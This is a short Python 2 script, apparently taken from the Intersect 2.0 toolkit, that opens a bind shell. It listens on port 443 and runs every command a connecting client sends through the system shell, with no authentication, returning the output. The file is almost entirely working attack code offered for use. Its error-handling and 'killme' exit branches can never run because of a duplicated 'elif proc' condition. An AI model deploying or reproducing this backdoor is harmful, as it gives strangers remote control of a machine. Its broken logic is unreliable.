#!/usr/bin/python

# Simple python tcp shell
# http://bind.shell.la | ohdae
#
# Stripped from the Intersect 2.0 code to act as a small stand-alone shell
# Use netcat or similar application to connect and use the shell
# or you can just run it as a bindshell and use it for download/upload via nc as well



import socket
import os, sys
from subprocess import Popen,PIPE,STDOUT,call

HOST = ''
PORT = 443

socksize = 4096
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))

print "[!] Shell bound on %s" % PORT

server.listen(5)
conn, addr = server.accept()

print "[!] New Connection: %s" % addr[0]
conn.send("shell :"+str(os.getcwd())+" $ ")

while True:
    cmd = conn.recv(socksize)
    proc = Popen(cmd,
         shell=True,
         stdout=PIPE,
         stderr=PIPE,
         stdin=PIPE,
         )
    stdout, stderr = proc.communicate()
    if cmd.startswith('cd'):
        os.chdir(cmd[3:].replace('\n',''))
        conn.send("\nshell :"+str(os.getcwd())+" $ ")
    elif proc:
        conn.sendall( stdout )
        conn.send("\nshell :"+str(os.getcwd())+" $ ")
    elif proc:
        conn.sendall("[!] Error: " + stderr)
        conn.send("\nshell :"+str(os.getcwd())+" $ ")
    elif cmd.startswith('killme'):
        conn.send("\n[!] Closing connection now!")
        conn.close()
        sys.exit()

